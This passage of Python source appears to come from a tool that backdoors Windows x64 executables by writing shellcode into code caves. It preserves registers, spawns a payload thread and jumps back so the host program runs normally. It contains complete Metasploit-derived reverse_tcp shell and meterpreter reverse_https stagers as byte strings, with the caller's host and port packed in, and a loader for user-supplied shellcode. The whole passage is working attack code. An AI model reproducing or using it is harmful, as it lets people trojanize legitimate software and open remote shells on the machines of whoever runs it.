                                                                # ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
                            "\x41\x52"                          #push r10 ; push back the return address
                            "\xFF\xE0"                          #jmp rax ; Jump into the required function
                                                                #; We now automagically return to the correct caller...
                            #get_next_mod: ;
                            "\x58"                              #pop rax ; Pop off the current (now the previous) modules EAT
                            #get_next_mod1: ;
                            "\x41\x59"                          #pop r9 ; Pop off the current (now the previous) modules hash
                            "\x5A"                              #pop rdx ; Restore our position in the module list
                            "\x48\x8B\x12"                      #mov rdx, [rdx] ; Get the next module
                            "\xe9\x57\xff\xff\xff"              #jmp next_mod ; Process this module
                            )

        self.shellcode1 += (#allocate
                            "\x5d"                              #pop rbp
                            "\x49\xc7\xc6\xab\x01\x00\x00"      #mov r14, 1abh size of payload
                            "\x6a\x40"                          #push 40h
                            "\x41\x59"                          #pop r9 now 40h
                            "\x68\x00\x10\x00\x00"              #push 1000h
                            "\x41\x58"                          #pop r8.. now 1000h
                            "\x4C\x89\xF2"                      #mov rdx, r14
                            "\x6A\x00"                          # push 0
                            "\x59"                              # pop rcx
                            "\x68\x58\xa4\x53\xe5"              #push E553a458
                            "\x41\x5A"                          #pop r10
                            "\xff\xd5"                          #call rbp
                            "\x48\x89\xc3"                      #mov rbx, rax      ; Store allocated address in ebx
                            "\x48\x89\xc7"                      #mov rdi, rax      ; Prepare EDI with the new address
                            "\x48\xC7\xC1\xAB\x01\x00\x00"      #mov rcx, 0x1ab
                            )
        
        #call the get_payload right before the payload
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x43" 

                            # got_payload:
        self.shellcode1 += ( "\x5e"                                 #pop rsi            ; Prepare ESI with the source to copy               
                            "\xf2\xa4"                              #rep movsb          ; Copy the payload to RWX memory
                            "\xe8\x00\x00\x00\x00"                  #call set_handler   ; Configure error handling

                            #Not Used... :/  Can probably live without.. 
                            #exitfunk:
                            #"\x48\xC7\xC3\xE0\x1D\x2A\x0A"          #   mov rbx, 0x0A2A1DE0    ; The EXITFUNK as specified by user...
                            #"\x68\xa6\x95\xbd\x9d"                  #   push 0x9DBD95A6        ; hash( "kernel32.dll", "GetVersion" )
                            #"\xFF\xD5"                              #   call rbp               ; GetVersion(); (AL will = major version and AH will = minor version)
                            #"\x3C\x06"                              #   cmp al, byte 6         ; If we are not running on Windows Vista, 2008 or 7
                            #"\x7c\x0a"                              #   jl goodbye       ; Then just call the exit function...
                            #"\x80\xFB\xE0"                          #  cmp bl, 0xE0           ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
                            #"\x75\x05"                              #   jne goodbye      ;
                            #"\x48\xC7\xC3\x47\x13\x72\x6F"          #   mov rbx, 0x6F721347    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread
                            # goodbye:                 ; We now perform the actual call to the exit function
                            #"\x6A\x00"                              #   push byte 0            ; push the exit function parameter
                            #"\x53"                                  #   push rbx               ; push the hash of the exit function
                            #"\xFF\xD5"                              #   call rbp               ; call EXITFUNK( 0 );

                            #set_handler:
                            "\x48\x31\xC0" #  xor rax,rax
                            
                            "\x50"                                  #  push rax          ; LPDWORD lpThreadId (NULL)
                            "\x50"                                  #  push rax          ; DWORD dwCreationFlags (0)
                            "\x49\x89\xC1"                          # mov r9, rax        ; LPVOID lpParameter (NULL)
                            "\x48\x89\xC2"                          #mov rdx, rax        ; LPTHREAD_START_ROUTINE lpStartAddress (payload)
                            "\x49\x89\xD8"                          #mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            "\x48\x89\xC1"                          #mov rcx, rax        ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
                            "\x49\xC7\xC2\x38\x68\x0D\x16"          #mov r10, 0x160D6838  ; hash( "kernel32.dll", "CreateThread" )
                            "\xFF\xD5"                              #  call rbp               ; Spawn payload thread
                            "\x48\x83\xC4\x58"                      #add rsp, 50
                            
                            #stackrestore
                            "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            )
        
        
        breakupvar = eat_code_caves(flItms, 0, 2)
        
        #Jump to the win64 return to normal execution code segment.
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip('L')), 16))
        else:
            self.shellcode1 += "\xE9\xab\x01\x00\x00"

        
        breakupvar = eat_code_caves(flItms, 0, 1)
        
        #get_payload:  #Jump back with the address for the payload on the stack.
        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 272).rstrip('L')), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 272).rstrip('L')), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 244).rstrip('L')), 16))
        else:
            self.shellcode2 = "\xE8\xB8\xFF\xFF\xFF"
        
        """
        shellcode2
        /*
         * windows/x64/shell/reverse_tcp - 422 bytes (stage 1)
           ^^windows/x64/meterpreter/reverse_tcp will work with this
         * http://www.metasploit.com
         * VERBOSE=false, LHOST=127.0.0.1, LPORT=8080, 
         * ReverseConnectRetries=5, ReverseListenerBindPort=0, 
         * ReverseAllowProxy=false, EnableStageEncoding=false, 
         * PrependMigrate=false, EXITFUNC=thread, 
         * InitialAutoRunScript=, AutoRunScript=
         */
         """
                       
        #payload  
        self.shellcode2 += ( "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
                            "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                            "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                            "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                            "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                            "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
                            "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
                            "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
                            "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
                            "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
                            "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
                            "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
                            "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
                            "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
                            "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
                            "\x49\x89\xe5\x49\xbc\x02\x00"
                            #"\x1f\x90"
                            #"\x7f\x00\x00\x01"
                            )
        self.shellcode2 += struct.pack('!h', self.PORT)
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += ( "\x41\x54"
                            "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
                            "\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
                            "\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
                            "\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
                            "\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
                            "\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x48\x83\xec"
                            "\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41"
                            "\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e\x6a\x40\x41"
                            "\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41"
                            "\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
                            "\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8"
                            "\x5f\xff\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41"
                            "\xff\xe7"
                            )

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def meterpreter_reverse_https(self, flItms, CavesPicked={}):
        """
        Win64 version
        """
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)
        
        flItms['stager'] = True

        #overloading the class stackpreserve
        self.stackpreserve = ("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        breakupvar = eat_code_caves(flItms, 0, 1)
       
        self.shellcode1 = ( "\x90"                              #<--THAT'S A NOP. \o/
                            "\xe8\xc0\x00\x00\x00"              #jmp to allocate
                            #api_call
                            "\x41\x51"                          #push r9
                            "\x41\x50"                          #push r8
                            "\x52"                              #push rdx
                            "\x51"                              #push rcx
                            "\x56"                              #push rsi
                            "\x48\x31\xD2"                      #xor rdx,rdx
                            "\x65\x48\x8B\x52\x60"              #mov rdx,qword ptr gs:[rdx+96]
                            "\x48\x8B\x52\x18"                  #mov rdx,qword ptr [rdx+24]
                            "\x48\x8B\x52\x20"                  #mov rdx,qword ptr[rdx+32]
                            #next_mod
                            "\x48\x8b\x72\x50"                  #mov rsi,[rdx+80]
                            "\x48\x0f\xb7\x4a\x4a"              #movzx rcx,word [rdx+74]      
                            "\x4d\x31\xc9"                      #xor r9,r9
                            #loop_modname
                            "\x48\x31\xc0"                      #xor rax,rax          
                            "\xac"                              #lods
                            "\x3c\x61"                          #cmp al, 61h (a)
                            "\x7c\x02"                          #jl 02
                            "\x2c\x20"                          #sub al, 0x20 
                            #not_lowercase
                            "\x41\xc1\xc9\x0d"                  #ror r9d, 13
                            "\x41\x01\xc1"                      #add r9d, eax
                            "\xe2\xed"                          #loop until read, back to xor rax, rax
                            "\x52"                              #push rdx ; Save the current position in the module list for later
                            "\x41\x51"                          #push r9 ; Save the current module hash for later
                                                                #; Proceed to itterate the export address table,
                            "\x48\x8b\x52\x20"                  #mov rdx, [rdx+32] ; Get this modules base address
                            "\x8b\x42\x3c"                      #mov eax, dword [rdx+60] ; Get PE header
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address
                            "\x8b\x80\x88\x00\x00\x00"          #mov eax, dword [rax+136] ; Get export tables RVA
                            "\x48\x85\xc0"                      #test rax, rax ; Test if no export address table is present
                            
                            "\x74\x67"                          #je get_next_mod1 ; If no EAT present, process the next module
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address
                            "\x50"                              #push rax ; Save the current modules EAT
                            "\x8b\x48\x18"                      #mov ecx, dword [rax+24] ; Get the number of function names
                            "\x44\x8b\x40\x20"                  #mov r8d, dword [rax+32] ; Get the rva of the function names
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                                                                #; Computing the module hash + function hash
                            #get_next_func: ;
                            "\xe3\x56"                          #jrcxz get_next_mod ; When we reach the start of the EAT (we search backwards), process the next module
                            "\x48\xff\xc9"                      #  dec rcx ; Decrement the function name counter
                            "\x41\x8b\x34\x88"                  #  mov esi, dword [r8+rcx*4]; Get rva of next module name
                            "\x48\x01\xd6"                      #  add rsi, rdx ; Add the modules base address
                            "\x4d\x31\xc9"                      # xor r9, r9 ; Clear r9 which will store the hash of the function name
                                                                #  ; And compare it to the one we wan                        
                            #loop_funcname: ;
                            "\x48\x31\xc0"                      #xor rax, rax ; Clear rax
                            "\xac"                              #lodsb ; Read in the next byte of the ASCII function name
                            "\x41\xc1\xc9\x0d"                  #ror r9d, 13 ; Rotate right our hash value
                            "\x41\x01\xc1"                      #add r9d, eax ; Add the next byte of the name
                            "\x38\xe0"                          #cmp al, ah ; Compare AL (the next byte from the name) to AH (null)
                            "\x75\xf1"                          #jne loop_funcname ; If we have not reached the null terminator, continue
                            "\x4c\x03\x4c\x24\x08"              #add r9, [rsp+8] ; Add the current module hash to the function hash
                            "\x45\x39\xd1"                      #cmp r9d, r10d ; Compare the hash to the one we are searchnig for
                            "\x75\xd8"                          #jnz get_next_func ; Go compute the next function hash if we have not found it
                                                                #; If found, fix up stack, call the function and then value else compute the next one...
                            "\x58"                              #pop rax ; Restore the current modules EAT
                            "\x44\x8b\x40\x24"                  #mov r8d, dword [rax+36] ; Get the ordinal table rva
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                            "\x66\x41\x8b\x0c\x48"              #mov cx, [r8+2*rcx] ; Get the desired functions ordinal
                            "\x44\x8b\x40\x1c"                  #mov r8d, dword [rax+28] ; Get the function addresses table rva
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                            "\x41\x8b\x04\x88"                  #mov eax, dword [r8+4*rcx]; Get the desired functions RVA
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address to get the functions actual VA
                                                                #; We now fix up the stack and perform the call to the drsired function...
                            #finish:
                            "\x41\x58"                          #pop r8 ; Clear off the current modules hash
                            "\x41\x58"                          #pop r8 ; Clear off the current position in the module list
                            "\x5E"                              #pop rsi ; Restore RSI
                            "\x59"                              #pop rcx ; Restore the 1st parameter
                            "\x5A"                              #pop rdx ; Restore the 2nd parameter
                            "\x41\x58"                          #pop r8 ; Restore the 3rd parameter
                            "\x41\x59"                          #pop r9 ; Restore the 4th parameter
                            "\x41\x5A"                          #pop r10 ; pop off the return address
                            "\x48\x83\xEC\x20"                  #sub rsp, 32 ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
                                                                # ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
                            "\x41\x52"                          #push r10 ; push back the return address
                            "\xFF\xE0"                          #jmp rax ; Jump into the required function
                                                                #; We now automagically return to the correct caller...
                            #get_next_mod: ;
                            "\x58"                              #pop rax ; Pop off the current (now the previous) modules EAT
                            #get_next_mod1: ;
                            "\x41\x59"                          #pop r9 ; Pop off the current (now the previous) modules hash
                            "\x5A"                              #pop rdx ; Restore our position in the module list
                            "\x48\x8B\x12"                      #mov rdx, [rdx] ; Get the next module
                            "\xe9\x57\xff\xff\xff"              #jmp next_mod ; Process this module
                            )

        self.shellcode1 += (#allocate
                            "\x5d"                              #pop rbp
                            "\x49\xc7\xc6"                      #mov r14, 1abh size of payload...   
                            )
        self.shellcode1 += struct.pack("<H", 583 + len(self.HOST))
        self.shellcode1 += ("\x00\x00"
                            "\x6a\x40"                          #push 40h
                            "\x41\x59"                          #pop r9 now 40h
                            "\x68\x00\x10\x00\x00"              #push 1000h
                            "\x41\x58"                          #pop r8.. now 1000h
                            "\x4C\x89\xF2"                      #mov rdx, r14
                            "\x6A\x00"                          # push 0
                            "\x59"                              # pop rcx
                            "\x68\x58\xa4\x53\xe5"              #push E553a458
                            "\x41\x5A"                          #pop r10
                            "\xff\xd5"                          #call rbp
                            "\x48\x89\xc3"                      #mov rbx, rax      ; Store allocated address in ebx
                            "\x48\x89\xc7"                      #mov rdi, rax      ; Prepare EDI with the new address
                            )
                                                                #mov rcx, 0x1abE
        self.shellcode1 += "\x48\xc7\xc1"
        self.shellcode1 += struct.pack("<H", 583 + len(self.HOST))
        self.shellcode1 += "\x00\x00"
                            
        #call the get_payload right before the payload
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x43" 

                            # got_payload:
        self.shellcode1 += ( "\x5e"                                 #pop rsi            ; Prepare ESI with the source to copy               
                            "\xf2\xa4"                              #rep movsb          ; Copy the payload to RWX memory
                            "\xe8\x00\x00\x00\x00"                  #call set_handler   ; Configure error handling

                            #set_handler:
                            "\x48\x31\xC0" #  xor rax,rax
                            
                            "\x50"                                  #  push rax          ; LPDWORD lpThreadId (NULL)
                            "\x50"                                  #  push rax          ; DWORD dwCreationFlags (0)
                            "\x49\x89\xC1"                          # mov r9, rax        ; LPVOID lpParameter (NULL)
                            "\x48\x89\xC2"                          #mov rdx, rax        ; LPTHREAD_START_ROUTINE lpStartAddress (payload)
                            "\x49\x89\xD8"                          #mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            "\x48\x89\xC1"                          #mov rcx, rax        ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
                            "\x49\xC7\xC2\x38\x68\x0D\x16"          #mov r10, 0x160D6838  ; hash( "kernel32.dll", "CreateThread" )
                            "\xFF\xD5"                              #  call rbp               ; Spawn payload thread
                            "\x48\x83\xC4\x58"                      #add rsp, 50
                            
                            #stackrestore
                            "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            )
        
        
        breakupvar = eat_code_caves(flItms, 0, 2)
        
        #Jump to the win64 return to normal execution code segment.
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip('L')), 16))
        else:
            self.shellcode1 += "\xE9"
            self.shellcode1 += struct.pack("<H", 583 + len(self.HOST))
            self.shellcode1 += "\x00\x00"
            #self.shellcode1 += "\xE9\x47\x02\x00\x00"

        
        breakupvar = eat_code_caves(flItms, 0, 1)
        
        #get_payload:  #Jump back with the address for the payload on the stack.
        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 272).rstrip('L')), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 272).rstrip('L')), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 244).rstrip('L')), 16))
        else:
            self.shellcode2 = "\xE8\xB8\xFF\xFF\xFF"
        
        """
         /*
         * windows/x64/meterpreter/reverse_https - 587 bytes (stage 1)
         * http://www.metasploit.com
         * VERBOSE=false, LHOST=127.0.0.1, LPORT=8080, 
         * SessionExpirationTimeout=604800, 
         * SessionCommunicationTimeout=300, 
         * MeterpreterUserAgent=Mozilla/4.0 (compatible; MSIE 6.1; 
         * Windows NT), MeterpreterServerName=Apache, 
         * ReverseListenerBindPort=0, 
         * HttpUnknownRequestResponse=<html><body><h1>It 
         * works!</h1></body></html>, EnableStageEncoding=false, 
         * PrependMigrate=false, EXITFUNC=thread, AutoLoadStdapi=true, 
         * InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true, 
         * EnableUnicodeEncoding=true
         */
        """
                       
        #payload
        self.shellcode2 += ("\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52"
                        "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                        "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                        "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                        "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                        "\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00"
                        "\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b"
                        "\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
                        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
                        "\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
                        "\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b"
                        "\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41"
                        "\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41"
                        "\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff"
                        "\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56"
                        "\x49\x89\xe6\x4c\x89\xf1\x49\xba\x4c\x77\x26\x07\x00\x00\x00"
                        "\x00\xff\xd5\x6a\x00\x6a\x00\x48\x89\xe1\x48\x31\xd2\x4d\x31"
                        "\xc0\x4d\x31\xc9\x41\x50\x41\x50\x49\xba\x3a\x56\x79\xa7\x00"
                        "\x00\x00\x00\xff\xd5\xe9\x9e\x00\x00\x00\x5a\x48\x89\xc1\x49"
                        "\xb8")
        self.shellcode2 += struct.pack("<h", self.PORT)    
        self.shellcode2 += ("\x00\x00\x00\x00\x00\x00\x4d\x31\xc9\x41\x51\x41"
                        "\x51\x6a\x03\x41\x51\x49\xba\x57\x89\x9f\xc6\x00\x00\x00\x00"
                        "\xff\xd5\xeb\x7c\x48\x89\xc1\x48\x31\xd2\x41\x58\x4d\x31\xc9"
                        "\x52\x68\x00\x32\xa0\x84\x52\x52\x49\xba\xeb\x55\x2e\x3b\x00"
                        "\x00\x00\x00\xff\xd5\x48\x89\xc6\x6a\x0a\x5f\x48\x89\xf1\x48"
                        "\xba\x1f\x00\x00\x00\x00\x00\x00\x00\x6a\x00\x68\x80\x33\x00"
                        "\x00\x49\x89\xe0\x49\xb9\x04\x00\x00\x00\x00\x00\x00\x00\x49"
                        "\xba\x75\x46\x9e\x86\x00\x00\x00\x00\xff\xd5\x48\x89\xf1\x48"
                        "\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x52\x52\x49\xba\x2d\x06\x18"
                        "\x7b\x00\x00\x00\x00\xff\xd5\x85\xc0\x75\x24\x48\xff\xcf\x74"
                        "\x13\xeb\xb1\xe9\x81\x00\x00\x00\xe8\x7f\xff\xff\xff\x2f\x75"
                        "\x47\x48\x58\x00\x00\x49\xbe\xf0\xb5\xa2\x56\x00\x00\x00\x00"
                        "\xff\xd5\x48\x31\xc9\x48\xba\x00\x00\x40\x00\x00\x00\x00\x00"
                        "\x49\xb8\x00\x10\x00\x00\x00\x00\x00\x00\x49\xb9\x40\x00\x00"
                        "\x00\x00\x00\x00\x00\x49\xba\x58\xa4\x53\xe5\x00\x00\x00\x00"
                        "\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda"
                        "\x49\xb8\x00\x20\x00\x00\x00\x00\x00\x00\x49\x89\xf9\x49\xba"
                        "\x12\x96\x89\xe2\x00\x00\x00\x00\xff\xd5\x48\x83\xc4\x20\x85"
                        "\xc0\x74\x99\x48\x8b\x07\x48\x01\xc3\x48\x85\xc0\x75\xce\x58"
                        "\x58\xc3\xe8\xd7\xfe\xff\xff")
        self.shellcode2 += self.HOST
        self.shellcode2 +=  "\x00"


        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def user_supplied_shellcode(self, flItms, CavesPicked={}):
        """
        User supplies the shellcode, make sure that it EXITs via a thread.
        """
        
        flItms['stager'] = True

        if flItms['supplied_shellcode'] is None:
            print "[!] User must provide shellcode for this module (-U)"
            sys.exit(0)
        else:
            self.supplied_shellcode =  open(self.SUPPLIED_SHELLCODE, 'r+b').read()


        #overloading the class stackpreserve
        self.stackpreserve = ("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        breakupvar = eat_code_caves(flItms, 0, 1)
       
        self.shellcode1 = ( "\x90"                              #<--THAT'S A NOP. \o/
                            "\xe8\xc0\x00\x00\x00"              #jmp to allocate
                            #api_call
                            "\x41\x51"                          #push r9
                            "\x41\x50"                          #push r8
                            "\x52"                              #push rdx
                            "\x51"                              #push rcx
                            "\x56"                              #push rsi
                            "\x48\x31\xD2"                      #xor rdx,rdx
                            "\x65\x48\x8B\x52\x60"              #mov rdx,qword ptr gs:[rdx+96]
                            "\x48\x8B\x52\x18"                  #mov rdx,qword ptr [rdx+24]
                            "\x48\x8B\x52\x20"                  #mov rdx,qword ptr[rdx+32]
                            #next_mod
                            "\x48\x8b\x72\x50"                  #mov rsi,[rdx+80]
                            "\x48\x0f\xb7\x4a\x4a"              #movzx rcx,word [rdx+74]      
                            "\x4d\x31\xc9"                      #xor r9,r9
                            #loop_modname
                            "\x48\x31\xc0"                      #xor rax,rax          
                            "\xac"                              #lods
                            "\x3c\x61"                          #cmp al, 61h (a)
                            "\x7c\x02"                          #jl 02
                            "\x2c\x20"                          #sub al, 0x20 
                            #not_lowercase
                            "\x41\xc1\xc9\x0d"                  #ror r9d, 13
                            "\x41\x01\xc1"                      #add r9d, eax
                            "\xe2\xed"                          #loop until read, back to xor rax, rax
                            "\x52"                              #push rdx ; Save the current position in the module list for later
                            "\x41\x51"                          #push r9 ; Save the current module hash for later
                                                                #; Proceed to itterate the export address table,
                            "\x48\x8b\x52\x20"                  #mov rdx, [rdx+32] ; Get this modules base address
                            "\x8b\x42\x3c"                      #mov eax, dword [rdx+60] ; Get PE header
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address
                            "\x8b\x80\x88\x00\x00\x00"          #mov eax, dword [rax+136] ; Get export tables RVA
                            "\x48\x85\xc0"                      #test rax, rax ; Test if no export address table is present
                            
                            "\x74\x67"                          #je get_next_mod1 ; If no EAT present, process the next module
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address
                            "\x50"                              #push rax ; Save the current modules EAT
                            "\x8b\x48\x18"                      #mov ecx, dword [rax+24] ; Get the number of function names
                            "\x44\x8b\x40\x20"                  #mov r8d, dword [rax+32] ; Get the rva of the function names
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                                                                #; Computing the module hash + function hash
                            #get_next_func: ;
                            "\xe3\x56"                          #jrcxz get_next_mod ; When we reach the start of the EAT (we search backwards), process the next module
                            "\x48\xff\xc9"                      #  dec rcx ; Decrement the function name counter
                            "\x41\x8b\x34\x88"                  #  mov esi, dword [r8+rcx*4]; Get rva of next module name
                            "\x48\x01\xd6"                      #  add rsi, rdx ; Add the modules base address
                            "\x4d\x31\xc9"                      # xor r9, r9 ; Clear r9 which will store the hash of the function name
                                                                #  ; And compare it to the one we wan                        
                            #loop_funcname: ;
                            "\x48\x31\xc0"                      #xor rax, rax ; Clear rax
                            "\xac"                              #lodsb ; Read in the next byte of the ASCII function name
                            "\x41\xc1\xc9\x0d"                  #ror r9d, 13 ; Rotate right our hash value
                            "\x41\x01\xc1"                      #add r9d, eax ; Add the next byte of the name
                            "\x38\xe0"                          #cmp al, ah ; Compare AL (the next byte from the name) to AH (null)
